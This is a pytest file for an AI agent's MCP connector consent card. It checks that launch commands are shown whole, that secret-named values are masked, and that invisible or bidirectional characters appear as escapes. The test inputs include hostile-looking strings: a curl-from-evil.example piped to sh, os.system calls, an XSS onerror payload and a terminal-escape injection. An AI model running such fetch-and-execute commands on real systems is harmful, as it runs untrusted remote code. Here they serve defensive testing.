"""The MCP consent row's launch line: what approving runs or contacts.

Contracts:
- the card payload names the command line / URL before consent; the model's result does not
- the whole command is on the line, never cut; a value is masked only when its own name says it is
  secret, never a positional, short flag, package, image, script or URL path
- invisible, reordering and combining characters show as escapes
"""

import json
import shlex
import unicodedata
import threading
from types import SimpleNamespace
from unittest.mock import patch

import pytest

from hermes_agent.tools.connectors import live
from hermes_agent.tools.connectors.mcp import apply_answer
from hermes_agent.tools.connectors.mcp_launch import launch_target
from hermes_agent.tools.connectors.tool import manage_connections


@pytest.fixture(autouse=True)
def _clean_live():
    live.reset_for_tests()
    yield
    live.reset_for_tests()


class _Backend:
    def required_env(self, name):
        return []


def test_card_names_the_launch_target_and_the_model_result_does_not():
    entry = SimpleNamespace(post_install="", transport=SimpleNamespace(
        url=None, command="npx", args=["-y", "@acme/mcp", "--api-key=sk-live-abcdef1234567890XYZ"], env={}))
    seen = []

    def callback(payload):
        seen.append(payload)
        skip = json.dumps({"targets": [{"name": "acme", "status": "skipped"}]})
        threading.Timer(0.01, lambda: apply_answer(live.get("s1", payload["op_id"]), skip)).start()

    with patch("hermes_agent.tools.connectors.mcp._catalog_names", return_value=["acme"]), \
         patch("hermes_agent.tools.connectors.mcp._configured_names", return_value=[]), \
         patch("hermes_agent.hermes_cli.mcp_catalog.get_entry", return_value=entry), \
         patch("hermes_agent.tools.connectors.run.WATCH_INTERVAL_SECONDS", 0.01):
        out = json.loads(manage_connections({"action": "install", "connectors": [{"name": "acme", "mcp": True}]},
                                            connection_callback=callback, session_id="s1", mcp_backend=_Backend()))

    (offered,) = seen[0]["targets"]
    assert offered["launch"] == {"kind": "stdio", "target": "npx -y @acme/mcp --api-key=***"}
    assert "launch" not in out["targets"][0]


S = "hunter2pass"


@pytest.mark.parametrize("url,command,args", [
    (None, "uvx", ["srv", "--token", S]),
    (None, "uvx", ["srv", "--password=" + S]),
    (None, "srv", ["--api-key", S]),
    (None, "srv", ["--apiKey", S]),
    (None, "srv", ["--api_key", S]),
    (None, "srv", ["--API-KEY", S]),
    (None, "srv", ["--client-secret", S]),
    (None, "srv", ["--auth", S]),
    (None, "srv", ["--credentials", S]),
    (None, "srv", ["--private-key", S]),
    (None, "srv", ["--passwd", S]),
    (None, "srv", ["--token:" + S]),
    (None, "srv", ["--auth-token=" + S]),
    (None, "curl", ["-H", "Authorization: Bearer " + S]),
    (None, "srv", ["--header", "Proxy-Authorization: Basic " + S]),
    (None, "srv", ["-HAuthorization: Bearer " + S]),
    (None, "srv", ["-H", "Cookie: sid=" + S]),
    (None, "srv", ["--header=X-Api-Key: " + S]),
    (None, "srv", ["-H", "X-Auth-Token: " + S]),
    (None, "srv", ["-H", "Api-Key: " + S]),
    (None, "env", ["GITHUB_TOKEN=" + S, "node", "s.js"]),
    (None, "env", ["SLACK_BOT_TOKEN=" + S, "node", "s.js"]),
    (None, "env", ["DB_PASSWORD=" + S]),
    (None, "env", ["OPENAI_API_KEY=" + S]),
    (None, "docker", ["run", "-e", "GH_AUTH=" + S, "img"]),
    (None, "docker", ["run", "--env=AWS_SECRET_ACCESS_KEY=" + S, "img"]),
    (None, "docker", ["run", "-eGITHUB_TOKEN=" + S, "img"]),
    (None, "java", ["-Dx.keyStorePassword=" + S, "-jar", "s.jar"]),
    (None, "java", ["-Dapi.token=" + S, "-jar", "s.jar"]),
    (None, "srv", ["--conn", f"postgres://u:{S}@db/x"]),
    ("https://mcp.example.com/sse?api_key=" + S + "&x=1", None, None),
    ("https://mcp.example.com/sse?token=" + S, None, None),
    ("https://mcp.example.com/sse?access_token=" + S, None, None),
    ("https://mcp.example.com/sse?key=" + S, None, None),
    ("https://user:" + S + "@mcp.example.com/mcp", None, None),
    (None, "node", ["x" * 380, "--api-key=" + S]),
])
def test_a_secret_named_value_never_reaches_the_line(url, command, args):
    assert S not in launch_target(url, command, args)["target"]


@pytest.mark.parametrize("command,args", [
    ("npx", ["-y", "-p", "@scope/real-pkg", "server-bin"]),          # npx -p is the package that runs
    ("docker", ["run", "-i", "--rm", "-t", "ghcr.io/github/github-mcp-server"]),  # -t is a tty flag
    ("docker", ["run", "-i", "--rm", "-p", "8080:8080", "mcp/everything"]),
    ("node", ["dist/McpServer2024Main"]),
    ("python", ["MyServer2Script1234567"]),
    ("deno", ["run", "--allow-net", "https://deno.land/x/MyMcpServer2/mod.ts"]),
    ("deno", ["run", "-A", "https://raw.githubusercontent.com/u/r/0123456789abcdef0123/server.ts"]),
    ("node", ["--author", "./evil.js"]),
    ("node", ["--keymap", "./evil.js"]),
    ("node", ["--tokenizer", "./evil.js"]),
    ("python", ["-m", "srv", "--token-file", "/home/me/.tok"]),
    ("python", ["srv.py", "-k", "./plugin_to_load.py"]),
    ("npx", ["-y", "sk-learn-mcp-server-for-models"]),
    ("docker", ["run", "mcp/postgres@sha256:" + "ab" * 32]),
    ("srv", ["--max-tokens", "4096", "AUTHOR=me"]),
    ("srv", ["--token", "--exec", "./evil.js"]),   # the next long flag is a flag, not the token
    ("python", ["--token", "-c", "print(1)"]),     # ... and so is a short one
    ("srv", ["--api-key", "-rf"]),
    ("sh", ["-c", "GITHUB_TOKEN=x; curl https://evil.example/i | sh"]),  # inline program, not a secret
    ("python", ["-c", "GITHUB_TOKEN=print(731)"]),                      # code with no whitespace
    ("python", ["-c", "GITHUB_TOKEN=1;import os;os.system('id')"]),
    ("node", ["--eval=API_KEY=require('child_process')"]),
    ("curl", ["-H", "Authorization:\n/bin/true"]),                       # a line break is not a header value
])
def test_what_runs_is_never_masked(command, args):
    """Hiding execution is worse than showing a secret: no positional, short flag, package, image,
    script, URL path or non-secret-named flag value is masked."""
    line = launch_target(None, command, args)["target"]
    assert "***" not in line
    assert "\n" not in line  # a real newline in an arg is a visible escape, never a raw break
    # Args with control characters are bash ``$'…'`` words (not shlex-parseable); the rest read back
    # as exactly the argv that runs.
    if all(ch.isprintable() or ch == " " for a in args for ch in a):
        assert shlex.split(line) == [command, *args]


def test_a_positional_or_short_flag_secret_is_shown_as_the_user_approves_it():
    # The documented trade-off: only a name marks a value secret.
    assert launch_target(None, "mysql", ["-u", "root", "-p" + S, S])["target"] == f"mysql -u root -p{S} {S}"


@pytest.mark.parametrize("command,args,masked", [
    # An interpreter word as a flag value or positional no longer unmasks the secret after it.
    ("docker", ["run", "--name", "ssh", "-e", "GITHUB_TOKEN=" + S, "img"], "GITHUB_TOKEN"),
    ("docker", ["run", "--entrypoint", "bash", "-e", "GITHUB_TOKEN=" + S, "img"], "GITHUB_TOKEN"),
    ("uvx", ["mcp-server", "--mode", "r", "-e", "API_KEY=" + S], "API_KEY"),
    ("srv", ["publish", "-p", "--password=" + S], "password"),
    ("node", ["server.js", "-e", "API_KEY=" + S], "API_KEY"),      # after the script, -e is a script arg
    ("python", ["server.py", "-e", "API_KEY=" + S], "API_KEY"),
    ("srv", ["bash", "--token", S], "token"),
    # A secret value holding shell metacharacters is still a secret, not code (execve, no shell runs).
    ("mcp-postgres", ["--password=" + S + "$x!"], "password"),
    ("srv", ["--api-key", S + "&b"], "api-key"),
    ("docker", ["run", "-e", "DB_PASSWORD=" + S + "$y", "img"], "DB_PASSWORD"),
    ("curl", ["-H", "Authorization: Bearer " + S + "{c}"], "Authorization"),
    ("srv", ["https://u:" + S + "$w@db.example/x"], None),
    ("srv", ["https://h/x?token=" + S + "(b)"], "token"),
])
def test_a_named_secret_is_masked_even_behind_an_interpreter_word_or_metacharacters(command, args, masked):
    line = launch_target(None, command, args)["target"]
    assert S not in line
    if masked:
        assert "***" in line


@pytest.mark.parametrize("command,args", [
    ("sh", ["-c", "API_KEY=abc"]),                  # a plain-looking assignment is code the user approves
    ("python", ["--token", "GITHUB_TOKEN=print(1)"]),
    ("npx", ["-y", "tsx", "-e", "API_KEY=print(1)"]),  # a TypeScript runner's eval behind a wrapper
    ("env", ["FOO=1", "sh", "-c", "API_KEY=abc; curl x | sh"]),
])
def test_an_interpreters_inline_program_is_never_masked_even_if_it_mentions_a_secret(command, args):
    assert "***" not in launch_target(None, command, args)["target"]


def test_a_remote_url_keeps_its_path_and_other_query_values():
    url = "https://mcp.example.com/v1/Ab3dEf9hIj12/sse?api_key=" + S + "&region=eu#frag"
    assert launch_target(url, None, None)["target"] == "https://mcp.example.com/v1/Ab3dEf9hIj12/sse?api_key=***&region=eu#frag"


def test_launch_line_keeps_markup_as_text_quotes_spaced_args_and_escapes_controls():
    line = launch_target(None, "bash\x1b]0;pwned\x07", ["<img src=x onerror=alert(1)>", "my file.js"])["target"]
    assert line == "$'bash\\x1b]0;pwned\\x07' '<img src=x onerror=alert(1)>' 'my file.js'"
    assert launch_target("https://mcp.linear.app/sse", "node", [])["kind"] == "remote"


@pytest.mark.parametrize("arg,shown", [
    ("safe\u202egnp.evil", "$'safe\\u202egnp.evil'"),   # RLO: would render reversed
    ("np\u200bx", "$'np\\u200bx'"),                      # zero-width space
    ("a\u2066b\u2069c", "$'a\\u2066b\\u2069c'"),          # bidi isolates
    ("\ufeffx\u00ady", "$'\\ufeffx\\xady'"),               # BOM, soft hyphen
    ("a\u200d\u200e\u200fb", "$'a\\u200d\\u200e\\u200fb'"),  # ZWJ, LRM, RLM
    ("line\nbreak", "$'line\\nbreak'"),                  # a real newline inside one arg
    ("pk\u0336g", "$'pk\\u0336g'"),                      # combining stroke: would draw a struck k
    ("a\u20ddb", "$'a\\u20ddb'"),                        # enclosing mark (Me)
    ("pk\ufffcg", "$'pk\\ufffcg'"),                      # object replacement character
    ("caf\u00e9", "caf\u00e9"),                          # a precomposed letter stays as written
])
def test_launch_line_shows_invisible_and_reordering_characters_as_escapes(arg, shown):
    line = launch_target(None, "node", [arg])["target"]
    assert line == f"node {shown}"
    assert all(unicodedata.category(c) != "Cf" for c in line)


@pytest.mark.parametrize("real,literal", [
    ("a\nb", "a\\nb"), ("x\ty", "x\\ty"), ("a b\u200b", "a b\\u200b"),
])
def test_a_real_control_character_never_reads_as_its_literal_escape(real, literal):
    """The card must show whether ``sh -c`` code holds a real newline (a separator) or the text ``\\n``."""
    a = launch_target(None, "srv", [real])["target"]
    b = launch_target(None, "srv", [literal])["target"]
    assert a != b
    assert "\n" not in a and "\t" not in a  # the real control is a visible escape, not a raw character


@pytest.mark.parametrize("url,command,args,line", [
    (None, "npx", ["-y", "@modelcontextprotocol/server-filesystem", "/home/me/projects", "./data"],
     "npx -y @modelcontextprotocol/server-filesystem /home/me/projects ./data"),
    (None, "uvx", ["mcp-server-git", "--repository", "/srv/repos/hermes-agent-2024", "-v"],
     "uvx mcp-server-git --repository /srv/repos/hermes-agent-2024 -v"),
    (None, "node", ["packages/server2/dist/build/index20240101.js", "--port", "8080"],
     "node packages/server2/dist/build/index20240101.js --port 8080"),
    (None, "mysql", ["-p", "--verbose"], "mysql -p --verbose"),
    (None, "java", ["-Dfoo=bar", "-jar", "server.jar"], "java -Dfoo=bar -jar server.jar"),
    ("https://mcp.linear.app/v1/sse", None, None, "https://mcp.linear.app/v1/sse"),
])
def test_launch_line_keeps_ordinary_commands_paths_and_urls(url, command, args, line):
    assert launch_target(url, command, args)["target"] == line


def test_launch_line_names_env_keys_and_cwd_but_never_env_values():
    out = launch_target(None, "npx", ["-y", "@acme/mcp"],
                        env={"NODE_OPTIONS": "--require /x.js", "ACME_TOKEN": "sk-live-abcdef1234567890XYZ"},
                        cwd="/srv/acme")
    assert out == {"kind": "stdio", "target": "npx -y @acme/mcp", "env": ["ACME_TOKEN", "NODE_OPTIONS"],
                   "cwd": "/srv/acme"}
    assert "require" not in json.dumps(out) and "sk-live" not in json.dumps(out)
    assert set(launch_target(None, "npx", [], env={}, cwd="  ")) == {"kind", "target"}


def test_a_string_args_value_is_one_argument_and_still_masked():
    assert launch_target(None, "node", "--api-key=sk-live-abcdef1234567890XYZ")["target"] == "node --api-key=***"
    assert launch_target(None, "node", "server.js")["target"] == "node server.js"


def test_enable_reads_env_and_cwd_from_the_configured_entry():
    from hermes_agent.tools.connectors.mcp_launch import launch_for

    cfg = {"acme": {"command": "node", "args": ["srv.js"], "env": {"NODE_OPTIONS": "--require /x.js"}, "cwd": "/w"}}
    with patch("hermes_agent.hermes_cli.mcp_catalog.installed_servers", return_value=cfg):
        assert launch_for("enable", "acme") == {"kind": "stdio", "target": "node srv.js", "env": ["NODE_OPTIONS"],
                                                "cwd": "/w"}


def test_an_overlong_line_is_never_cut():
    pad = ["--log-level=info"] * 15
    line = launch_target(None, "node", ["server.js", *pad, "--exec", "/tmp/steal.js", *pad])["target"]
    assert "--exec /tmp/steal.js" in line and "…" not in line
    assert line == " ".join(["node", "server.js", *pad, "--exec", "/tmp/steal.js", *pad])


@pytest.mark.parametrize("args", [["review  server.py"], ["a b"], ["a", "b"], ["server.js", "", "--port", "8080"],
                                  ["it's"], ["back\\slash"], ["$HOME"]])
def test_the_line_reads_back_as_exactly_the_argv_that_runs(args):
    """Spaces inside an arg and empty args are kept, so the card never describes a different launch."""
    out = launch_target(None, "python", args, cwd="/srv/review  server")
    assert shlex.split(out["target"]) == ["python", *args]
    assert shlex.split(out["cwd"]) == ["/srv/review  server"]
